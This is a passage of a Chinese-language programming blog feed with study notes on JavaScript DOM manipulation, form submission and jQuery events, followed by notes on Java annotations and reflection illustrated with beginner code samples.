punctuation">&lt;/</span>body</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="image-20210902181757405.png" alt="image-20210902181757405"></p><pre class="line-numbers language-js"><code class="language-js"><span class="token comment" spellcheck="true">//插入到指定子节点前面</span><span class="token keyword">let</span> h1 <span class="token operator">=</span> document<span class="token punctuation">.</span><span class="token function">getElementById</span><span class="token punctuation">(</span><span class="token string">"111"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>father<span class="token punctuation">.</span><span class="token function">insertBefore</span><span class="token punctuation">(</span>child<span class="token punctuation">,</span>h1<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//替换节点</span>father<span class="token punctuation">.</span><span class="token function">replaceChild</span><span class="token punctuation">(</span>child<span class="token punctuation">,</span>h1<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">/*语法： ...(新节点,已有节点)*/</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="操作表单"><a href="#操作表单" class="headerlink" title="操作表单"></a>操作表单</h3><p>表单操作同上，但有些许不同</p><pre class="line-numbers language-js"><code class="language-js"><span class="token punctuation">[</span>属性<span class="token punctuation">]</span><span class="token punctuation">.</span>checked<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// 查看该属性是否被选中，返回值为true或flase</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h4 id="提交表单-按钮绑定"><a href="#提交表单-按钮绑定" class="headerlink" title="提交表单-按钮绑定"></a>提交表单-按钮绑定</h4><pre class="line-numbers language-html"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>body</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>form</span> <span class="token attr-name">action</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>#<span class="token punctuation">"</span></span> <span class="token attr-name">method</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>post<span class="token punctuation">"</span></span> <span class="token punctuation">></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>p</span><span class="token punctuation">></span></span>     <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>text<span class="token punctuation">"</span></span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>name<span class="token punctuation">"</span></span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>names<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>p</span><span class="token punctuation">></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>button</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>submit<span class="token punctuation">"</span></span> <span class="token attr-name">onclick</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>funs()<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>提交<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>button</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>form</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span><span class="token punctuation">></span></span><span class="token script language-javascript">    <span class="token comment" spellcheck="true">// 可以进行修改加密等操作</span>      <span class="token keyword">function</span> <span class="token function">funs</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">let</span> unname <span class="token operator">=</span> document<span class="token punctuation">.</span><span class="token function">getElementById</span><span class="token punctuation">(</span><span class="token string">"name"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        unname<span class="token punctuation">.</span>value <span class="token operator">=</span> <span class="token string">"Mujie"</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> <span class="token boolean">true</span><span class="token punctuation">;</span>  <span class="token punctuation">}</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>body</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="image-20210902200141120.png" alt="image-20210902200141120"></p><h4 id="提交表单-表单绑定"><a href="#提交表单-表单绑定" class="headerlink" title="提交表单-表单绑定"></a>提交表单-表单绑定</h4><pre class="line-numbers language-html"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>body</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>form</span> <span class="token attr-name">action</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>https://www.baidu.com/<span class="token punctuation">"</span></span> <span class="token attr-name">method</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>post<span class="token punctuation">"</span></span> <span class="token attr-name">onsubmit</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>return funs()<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>p</span><span class="token punctuation">></span></span>     <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>text<span class="token punctuation">"</span></span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>name<span class="token punctuation">"</span></span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>names<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>p</span><span class="token punctuation">></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>button</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>submit<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>提交<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>button</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>form</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span><span class="token punctuation">></span></span><span class="token script language-javascript">  <span class="token keyword">function</span> <span class="token function">funs</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token function">alert</span><span class="token punctuation">(</span><span class="token string">"跳转"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> <span class="token boolean">false</span><span class="token punctuation">;</span>  <span class="token punctuation">}</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><strong>用表单绑定当<code>funs() return false;</code>时，表单无法提交，只有当<code>funs() return true;</code>时可以提交，所以建议使用这种方式</strong></p><h1 id="jQuery"><a href="#jQuery" class="headerlink" title="jQuery"></a><code>jQuery</code></h1><p><strong><code>jQuery</code>是一个封装了大量<code>js</code>代码的工具类，可以理解为时一个库</strong></p><p>使用<code>jQuery</code>可以去官网下载，也可以百度<code>cdn</code></p><pre class="line-numbers language-html"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>https://apps.bdimg.com/libs/jquery/2.1.4/jquery.min.js<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token script language-javascript"></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><strong>公式：</strong></p><p><strong><code>$(选择器selector).行为action()</code></strong></p><pre class="line-numbers language-html"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>html</span> <span class="token attr-name">lang</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>en<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>head</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>meta</span> <span class="token attr-name">charset</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>UTF-8<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>https://apps.bdimg.com/libs/jquery/2.1.4/jquery.min.js<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token script language-javascript"></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>title</span><span class="token punctuation">></span></span>jQ<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>title</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>head</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>body</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>button</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>aaa<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>点击<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>button</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span><span class="token punctuation">></span></span><span class="token script language-javascript">    <span class="token function">$</span><span class="token punctuation">(</span><span class="token string">'#aaa'</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">click</span><span class="token punctuation">(</span><span class="token keyword">function</span> <span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token function">alert</span><span class="token punctuation">(</span><span class="token string">"这是jQuery"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">)</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>body</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>html</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="选择器"><a href="#选择器" class="headerlink" title="选择器"></a>选择器</h2><pre class="line-numbers language-js"><code class="language-js"><span class="token function">$</span><span class="token punctuation">(</span><span class="token string">"p"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">click</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// 标签选择器</span><span class="token function">$</span><span class="token punctuation">(</span><span class="token string">"#id"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">click</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// id选择器</span><span class="token function">$</span><span class="token punctuation">(</span><span class="token string">".class"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">click</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// 类选择器</span><span class="token comment" spellcheck="true">// 更多选择器查阅网站   </span><span class="token comment" spellcheck="true">// https://jquery.cuishifeng.cn/</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="事件-or-行为"><a href="#事件-or-行为" class="headerlink" title="事件 or 行为"></a>事件 or 行为</h2><p>事情一般分三种：鼠标，键盘，其他  </p><h3 id="鼠标事件"><a href="#鼠标事件" class="headerlink" title="鼠标事件"></a>鼠标事件</h3><p><img src="image-20210903094409572.png" alt="image-20210903094409572"></p><pre class="line-numbers language-html"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>body</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>button</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>aaa<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>点击<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>button</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span><span class="token punctuation">></span></span><span class="token script language-javascript">    <span class="token function">$</span><span class="token punctuation">(</span><span class="token string">"button"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">mousemove</span><span class="token punctuation">(</span>        <span class="token keyword">function</span> <span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>            <span class="token keyword">this</span><span class="token punctuation">.</span>innerHTML <span class="token operator">=</span> <span class="token string">"快点"</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// 鼠标移动到按钮上显示</span>    <span class="token function">$</span><span class="token punctuation">(</span><span class="token string">"button"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">mouseout</span><span class="token punctuation">(</span>        <span class="token keyword">function</span> <span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>            <span class="token keyword">this</span><span class="token punctuation">.</span>innerHTML <span class="token operator">=</span> <span class="token string">"快回来"</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// 鼠标离开显示</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>body</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="示例-输出鼠标坐标"><a href="#示例-输出鼠标坐标" class="headerlink" title="示例-输出鼠标坐标"></a>示例-输出鼠标坐标</h3><pre class="line-numbers language-html"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>head</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>meta</span> <span class="token attr-name">charset</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>UTF-8<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>https://apps.bdimg.com/libs/jquery/2.1.4/jquery.min.js<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token script language-javascript"></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>title</span><span class="token punctuation">></span></span>jQ<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>title</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>style</span><span class="token punctuation">></span></span><span class="token style language-css">        <span class="token selector"><span class="token id">#divMove</span> </span><span class="token punctuation">{</span>            <span class="token property">border</span><span class="token punctuation">:</span> <span class="token number">1</span>px solid blue<span class="token punctuation">;</span>            <span class="token property">height</span><span class="token punctuation">:</span> <span class="token number">500</span>px<span class="token punctuation">;</span>            <span class="token property">width</span><span class="token punctuation">:</span> <span class="token number">400</span>px<span class="token punctuation">;</span>        <span class="token punctuation">}</span>    </span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>style</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>head</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>body</span><span class="token punctuation">></span></span><span class="token comment" spellcheck="true">&lt;!--&lt;button id="aaa">点击&lt;/button>&lt;br/>--></span>鼠标位置：<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>span</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>spanMove<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>span</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>divMove<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>在这里移动鼠标<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span><span class="token punctuation">></span></span><span class="token script language-javascript">    <span class="token function">$</span><span class="token punctuation">(</span><span class="token keyword">function</span> <span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token comment" spellcheck="true">//获取div</span>        <span class="token function">$</span><span class="token punctuation">(</span><span class="token string">"#divMove"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">mousemove</span><span class="token punctuation">(</span>            <span class="token keyword">function</span> <span class="token punctuation">(</span>e<span class="token punctuation">)</span><span class="token punctuation">{</span>                <span class="token comment" spellcheck="true">//获取span</span>                <span class="token function">$</span><span class="token punctuation">(</span><span class="token string">"#spanMove"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">text</span><span class="token punctuation">(</span><span class="token string">"x:"</span> <span class="token operator">+</span> e<span class="token punctuation">.</span>pageX <span class="token operator">+</span> <span class="token string">"; y:"</span> <span class="token operator">+</span>e<span class="token punctuation">.</span>pageY<span class="token punctuation">)</span>            <span class="token punctuation">}</span>        <span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>body</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="image-20210903211727112.png" alt="image-20210903211727112"></p><p><img src="image-20210903213917591.png" alt="image-20210903213917591"></p>]]></content>
      
      
      
        <tags>
            
            <tag> 语言 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>java注解与反射</title>
      <link href="/2021/08/17/java%E6%B3%A8%E8%A7%A3%E4%B8%8E%E5%8F%8D%E5%B0%84/"/>
      <url>/2021/08/17/java%E6%B3%A8%E8%A7%A3%E4%B8%8E%E5%8F%8D%E5%B0%84/</url>
      
        <content type="html"><![CDATA[<p><strong>笔记内容学自链接视频：<code>https://www.bilibili.com/video/BV1p4411P7V3</code></strong></p><h1 id="注解"><a href="#注解" class="headerlink" title="注解"></a>注解</h1><p><code>@override</code> 重写</p><p><code>@FunctionalInterface</code> 函数式接口</p><p><code>@Deprecated</code>已废弃（新版已经淘汰）</p><p><strong>注解不是程序本身，但可以对程序做出解释</strong></p><p><strong>注解可以加参数</strong></p><p>注释：只是给人看的</p><blockquote><p>注解：不但给人看，还给程序看</p></blockquote><p><strong>注解对程序有约束作用</strong></p><h2 id="内置注解"><a href="#内置注解" class="headerlink" title="内置注解"></a>内置注解</h2><p><img src="image-20210822132734258.png" alt="image-20210822132734258"></p><p><code>@SuppressWarnings</code>镇压警告</p><p><strong><code>@SuppressWarnings</code>不仅可以用在方法上，还可以用在类上</strong></p><p>参数：</p><blockquote><p><code>all</code>镇压全部警告</p><p><code>unchecked</code>镇压未检查的警告</p></blockquote><h2 id="元注解"><a href="#元注解" class="headerlink" title="元注解"></a>元注解</h2><p><strong>负责注解其他注解</strong></p><p><code>java</code>定义了四个元注解</p><blockquote><p><code>@Target</code>:目标  用于描述注解的使用范围</p><p><code>@Retention</code> 表示在什么级别保存该注释信息，用于描述注解的生命周期</p><p><code>@Documented</code>用于生成文档信息</p><p><code>@Inherited</code>说明子类可以继承父类的该注释</p></blockquote><p><img src="image-20210822170529055.png" alt="image-20210822170529055"></p><h2 id="自定义注解"><a href="#自定义注解" class="headerlink" title="自定义注解"></a>自定义注解</h2><p>使用<code>@interface</code>自定义注解，idea自动调用<code>java.lang.annotation.Annotation</code>接口</p><p><img src="image-20210822172136804.png" alt="image-20210822172136804"></p><p>注解参数：参数类型+参数名+()</p><pre class="line-numbers language-java"><code class="language-java"><span class="token annotation punctuation">@MyAnnotation</span><span class="token punctuation">(</span><span class="token string">"Atmujie"</span><span class="token punctuation">,</span>id <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token keyword">public</span> <span class="token keyword">class</span> 自定义注解 <span class="token punctuation">{</span><span class="token punctuation">}</span><span class="token annotation punctuation">@Target</span><span class="token punctuation">(</span>ElementType<span class="token punctuation">.</span>TYPE<span class="token punctuation">)</span><span class="token annotation punctuation">@Retention</span><span class="token punctuation">(</span>RetentionPolicy<span class="token punctuation">.</span>RUNTIME<span class="token punctuation">)</span>@<span class="token keyword">interface</span> <span class="token class-name">MyAnnotation</span><span class="token punctuation">{</span>    <span class="token comment" spellcheck="true">//设置注解传入参数并设置默认值为空</span>    String <span class="token function">value</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">default</span> <span class="token string">""</span><span class="token punctuation">;</span>    <span class="token keyword">int</span> <span class="token function">id</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">default</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//默认为-1代表不存在</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><strong>只有参数名为<code>values</code>时可以省略参数名,否则哟啊写为<code>参数名 = 值</code>的格式</strong></p><h1 id="反射"><a href="#反射" class="headerlink" title="反射"></a>反射</h1><p><code>Reflection</code>反射</p><p>反射机制允许程序在执行期间借助<code>Reflection API</code>取得类的任何信息，并能直接操作任意对象的内部属性和方法</p><h2 id="获取反射对象"><a href="#获取反射对象" class="headerlink" title="获取反射对象"></a>获取反射对象</h2><p><img src="image-20210823175227539.png" alt="image-20210823175227539"></p><p>反射的主要<code>API</code></p><blockquote><p><code>java.lang.Class</code>: 代表一个类</p><p><code>java.lang.reflect.Method</code>: 代表一个方法</p><p><code>java.lang.reflevt.Field</code>: 代表类的成员对象</p><p><code>java.lang.redlevt.Constructor</code> 代表类的构造器</p></blockquote><p><strong>一个类在内存中只有一个<code>Class</code></strong></p><p><strong>一个类被加载后，类的整个结构都会被封装在<code>Class</code>中</strong></p><p><strong>反射获取的就是类的<code>Class</code>对象</strong></p><p><img src="image-20210824165851282.png" alt="image-20210824165851282"></p><h2 id="得到Class类的方式"><a href="#得到Class类的方式" class="headerlink" title="得到Class类的方式"></a>得到<code>Class</code>类的方式</h2><p>一个<code>Class</code>对象对应的是加载到<code>JVM</code>虚拟机的一个<code>.class</code>实例</p><p>想反射必先得到<code>Class</code></p><p><img src="image-20210824170342690.png" alt="image-20210824170342690"></p><p><img src="image-20210824171433056.png" alt="image-20210824171433056"></p><pre class="line-numbers language-java"><code class="language-java"><span class="token comment" spellcheck="true">//获得</span><span class="token keyword">package</span> 注解与反射<span class="token punctuation">.</span>反射<span class="token punctuation">;</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">SuperClass</span> <span class="token punctuation">{</span>    <span class="token keyword">public</span> String name <span class="token operator">=</span> <span class="token string">"super"</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">int</span> values <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">int</span> time <span class="token operator">=</span> <span class="token number">18</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token function">SuperClass</span><span class="token punctuation">(</span>String name<span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">this</span><span class="token punctuation">.</span>name <span class="token operator">=</span> name<span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">public</span> String <span class="token function">Superclass</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token keyword">return</span> <span class="token keyword">this</span><span class="token punctuation">.</span>name<span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span>Class对象    <span class="token keyword">package</span> 注解与反射<span class="token punctuation">.</span>反射<span class="token punctuation">;</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">SuperClass</span> <span class="token punctuation">{</span>    <span class="token keyword">public</span> String name <span class="token operator">=</span> <span class="token string">"super"</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">int</span> values <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">int</span> time <span class="token operator">=</span> <span class="token number">18</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token function">SuperClass</span><span class="token punctuation">(</span>String name<span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">this</span><span class="token punctuation">.</span>name <span class="token operator">=</span> name<span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">public</span> String <span class="token function">Superclass</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token keyword">return</span> <span class="token keyword">this</span><span class="token punctuation">.</span>name<span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-java"><code class="language-java"><span class="token keyword">package</span> 注解与反射<span class="token punctuation">.</span>反射<span class="token punctuation">;</span><span class="token keyword">public</span> <span class="token keyword">class</span> 获取Class对象 <span class="token punctuation">{</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span>String<span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">try</span> <span class="token punctuation">{</span>            SuperClass superClass <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">SuperClass</span><span class="token punctuation">(</span><span class="token string">"Atmujie"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token comment" spellcheck="true">//通过对象获得Class</span>            Class<span class="token operator">&lt;</span><span class="token operator">?</span> <span class="token keyword">extends</span> <span class="token class-name">SuperClass</span><span class="token operator">></span> Class1 <span class="token operator">=</span> superClass<span class="token punctuation">.</span><span class="token function">getClass</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token comment" spellcheck="true">//通过forname获取Class(需要抛出异常)</span>            Class<span class="token operator">&lt;</span><span class="token operator">?</span><span class="token operator">></span> Class2 <span class="token operator">=</span> Class<span class="token punctuation">.</span><span class="token function">forName</span><span class="token punctuation">(</span><span class="token string">"HelloWorld.注解和反射.反射.SuperClass"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token comment" spellcheck="true">//通过类名获取Class</span>            Class<span class="token operator">&lt;</span>SuperClass<span class="token operator">></span> superClassClass <span class="token operator">=</span> SuperClass<span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">;</span>            <span class="token comment" spellcheck="true">//通过内置属性包装类的TYPE获取</span>            Class<span class="token operator">&lt;</span>Integer<span class="token operator">></span> integerClass <span class="token operator">=</span> Integer<span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">ClassNotFoundException</span> e<span class="token punctuation">)</span> <span class="token punctuation">{</span>            e<span class="token punctuation">.</span><span class="token function">printStackTrace</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span 